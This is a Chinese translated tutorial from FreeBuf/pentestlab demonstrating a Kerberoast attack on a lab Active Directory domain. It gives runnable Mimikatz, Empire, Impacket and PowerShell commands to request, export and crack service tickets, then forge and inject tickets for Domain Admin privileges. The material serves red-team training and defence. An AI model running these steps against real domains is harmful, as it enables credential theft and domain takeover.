**简单直白的说Kerberoast攻击，就是攻击者为了获取目标服务的访问权限，而设法破解Kerberos服务票据并重写它们的过程。这是红队当中非常常见的一种攻击手法，因为它不需要与服务目标服务进行任何交互，并且可以使用合法的活动目录访问来请求和导出可以离线破解的服务票据，以获取到最终的明文密码。之所以出现这种情况，是因为服务票据使用服务帐户的散列（NTLM）进行加密，所以任何域用户都可以从服务转储散列，而无需将shell引入运行该服务的系统中。**

攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。一旦攻击者成功破解出了票据，他们有时不仅仅获取的只是服务访问权限，如果服务被配置为在高权限下运行，那么整个域都将可能被攻击者拿下。这些票据可以通过考虑多种因素来识别，例如：

> SPNs绑定到域用户账户
>
> 最后一次密码设置（Password last set）
>
> 密码过期时间
>
> 最后一次登录（Last logon）

具体来说，Kerberoast攻击涉及以下五个步骤：

> [服务主体名称（SPN）发现](http://www.freebuf.com/system/174229.html?preview=true)
>
> 请求服务票据
>
> 导出服务票据
>
> 破解服务票据
>
> 重写服务票据&RAM注入

在[服务主体名称（SPN）发现这篇](http://www.freebuf.com/system/174229.html?preview=true)文章中，已经为大家介绍了如何通过查询Active
Directory的服务主体名称，来发现网络中服务的方法。

## 请求服务票据

为特定SPN请求服务票据的最简单方法是通过PowerShell，这个方法是[Tim
Medin](https://twitter.com/timmedin)在DerbyCon
4.0[演讲](https://www.youtube.com/watch?v=PUyhlN-E5MU)中介绍的。

    
    
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80"

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251123487.png!small)

执行klist命令将列出所有可用的缓存票据。

    
    
    klist

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251278587.png!small)

请求服务票据的另一种解决方案是通过Mimikatz指定服务主体名称作为目标。

    
    
    kerberos::ask /target:PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251432369.png!small)

与klist类似，内存中存在的Kerberos票据列表可以通过Mimikatz来检索。从现有的PowerShell会话中，Invoke-Mimikatz脚本将输出所有票据。

    
    
    Invoke-Mimikatz -Command '"kerberos::list"'

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251583791.png!small)

或者，加载Kiwi模块添加一些额外的Mimikatz命令，它们也可以执行相同的任务。

    
    
    load kiwi
    kerberos_ticket_list

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251751910.png!small)

还或者可以通过执行一个自定义的Kiwi命令：

    
    
    kiwi_cmd kerberos::list

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290251968968.png!small)

[Impacket](https://github.com/CoreSecurity/impacket)中有一个python模块，它可以请求仅属于域用户的Kerberos服务票据，与计算机帐户服务票据相比应该更易于破解。但是，想要与Active
Directory进行交互，需要有效的域凭据，因为它将从不属于域的系统执行。

    
    
    ./GetUserSPNs.py -request pentestlab.local/test

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290252145205.png!small)

服务帐户哈希也将以John the Ripper格式检索。

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290252339440.png!small)

使用[Matan
Hart](https://twitter.com/machosec)开发的PowerShell模块可以帮助我们自动识别弱服务票据，该模块是[RiskySPN](https://github.com/cyberark/RiskySPN)中的一部分。主要作用是对属于用户的可用服务票据执行审计，并根据用户帐户和密码过期时限来查找最容易包含弱密码的票据。

    
    
    Find-PotentiallyCrackableAccounts -FullData -Verbose

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290252526686.png!small)

该脚本将提供比klist和Mimikatz更详细的输出，包括组信息，密码有效期和破解窗口。

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290252718311.png!small)

使用domain参数执行同一模块，将返回所有具有关联服务主体名称的用户帐户。

    
    
    Find-PotentiallyCrackableAccounts -Domain "pentestlab.local"

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290252951230.png!small)

服务票据信息也可以以CSV格式导出，以便离线查看。

    
    
    Export-PotentiallyCrackableAccounts

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290253148975.png!small)

所有出现在控制台中的票据信息都将被写入文件中。

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290253334064.png!small)

这里还有一个脚本（相同存储库的一部分），可以通过其SPN为服务实例获取服务票据。

    
    
    Get-TGSCipher -SPN "PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80"

![14tgscipher-service-ticket-information.png](https://image.3001.net/images/20180615/15290253565137.png!small)

[Tim
Medin](https://twitter.com/timmedin)的[Kerberoast](https://github.com/nidem/kerberoast)工具包已实现流程的自动化。[Auto-Kerberoast](https://github.com/xan7r/kerberoast)中包含了Tim的原始脚本，其中包含两个可执行各种功能的PowerShell脚本，例如以Base64,
John和Hashcat格式列出和导出服务票据等。

    
    
    List-UserSPNs

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290253806256.png!small)

还有一个domain参数可以只列出特定域的SPN。

    
    
    List-UserSPNs -Domain "pentestlab.local"

##
![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290254088449.png!small)

## 导出服务票据

Mimikatz是可以导出Kerberos服务票据的标准工具。从PowerShell会话中，以下命令将列出内存中的所有可用票据，并将其保存在远程主机中。

    
    
    Invoke-Mimikatz -Command '"kerberos::list /export"'

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290254319756.png!small)

同样，PowerShell Empire有一个模块可以自动完成Kerberos服务票据提取任务。

    
    
    usemodule credentials/mimikatz/extract_tickets

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290254533176.png!small)

该模块将使用Invoke-Mimikatz函数自动执行以下命令。

    
    
    standard::base64
    kerberos::list /export

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290254803693.png!small)

支持Kerberos身份验证的服务票据哈希可以直接使用PowerShell Empire模块提取。哈希的格式可以提取为John或Hashcat。

    
    
    usemodule credentials/invoke_kerberoast

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290255017772.png!small)

该模块将检索所有服务帐户的密码哈希值。

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290255229182.png!small)

[AutoKerberoast
](https://github.com/xan7r/kerberoast)PowerShell脚本将请求并提取base64格式的所有服务票据。

    
    
    Invoke-AutoKerberoast

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290255424237.png!small)

AutoKerberoast存储库中还有一个[脚本](https://github.com/xan7r/kerberoast/blob/master/autokerberoast_noMimikatz.ps1)，它将以hashcat兼容格式显示提取的票据。

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290255661183.png!small)

属于特定域的提升组的票据也可以提取用于更具针对性的Kerberoasting。

    
    
    Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain pentestlab.local -HashFormat John

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290255937959.png!small)

[Matan Hart](https://twitter.com/machosec)开发的Get-TGSCipher
PowerShell模块，可以以三种不同的格式提取服务票据的密码哈希值：John，Hashcat和Kerberoast。可以在SPN发现过程中检索脚本所需的关联服务的服务主体名称。

    
    
    Get-TGSCipher -SPN "PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80" -Format John
    TGSCipher - Service Ticket Hash

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290256184780.png!small)

使用Get-TGSCipher函数的好处是，无需使用Mimikatz导出票据，这可以大大降低警报的触发，以及省去将票据转换为john格式的步骤。

## 破解服务票据

python脚本tgsrepcrack是[Tim Medin](https://twitter.com/TimMedin)
[Kerberoast](https://github.com/nidem/kerberoast)工具包的一部分，可以通过提供的密码列表来破解Kerberos票据。

    
    
    python tgsrepcrack.py /root/Desktop/passwords.txt PENTESTLAB_001.kirbi

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290256424186.png!small)

[Lee
Christensen](https://twitter.com/tifkin_)开发了一个名为extractServiceTicketParts的python脚本，它可以为我们提取服务票据的哈希值，以及一款Go语言编写的哈希破解器[tgscrack](https://github.com/leechristensen/tgscrack)
，两者可以配合使用。

    
    
    python extractServiceTicketParts.py PENTESTLAB_001.kirbi

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290256666570.png!small)

tgscrack需要我们为其指定哈希文件以及字典文件的本地存放路径。

    
    
    tgscrack.exe -hashfile hash.txt -wordlist passwords.txt

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290256885865.png!small)

密码将以明文显示。

如果PowerShell remoting已启用，则可以使用从服务票据中检索的密码执行远程命令等操作。

    
    
    Enable-PSRemoting
    $pass = 'Password123' | ConvertTo-SecureString -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential -ArgumentList 'PENTESTLAB_001', $pass
    Invoke-Command -ScriptBlock {get-process} -ComputerName WIN-PTELU2U07KG.PENTESTLAB.LOCAL -Credential $creds

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290257679816.png!small)

正在运行的进程列表将被检索

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290257937045.png!small)

## 服务票据重写&RAM注入

Kerberos票据使用密码的NTLM哈希签名。如果票据散列已被破解，那么可以使用[Kerberoast](https://github.com/nidem/kerberoast)
python脚本重写票据。这将允许在服务将被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。

    
    
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512

![一次详细的Kerberoast攻击演示](https://image.3001.net/images/20180615/15290258176526.png!small)

使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。

    
    
    kerberos::ptt PENTESTLAB.kirbi

## 相关资源

> <https://github.com/nidem/kerberoast>
>
> <https://github.com/xan7r/kerberoast>
>
> <https://github.com/cyberark/RiskySPN>
>
> <https://github.com/leechristensen/tgscrack>
>
> <http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/>
>
> <https://adsecurity.org/?p=2293>
>
> <https://www.blackhillsinfosec.com/a-toast-to-kerberoast/>
>
> <https://blog.xpnsec.com/kerberos-attacks-part-1/>
>
> <https://www.cyberark.com/blog/service-accounts-weakest-link-chain/>

** *参考来源：[pentestlab](https://pentestlab.blog/2018/06/12/kerberoast/)，FB小编
secist 编译，转载请注明来自FreeBuf.COM**

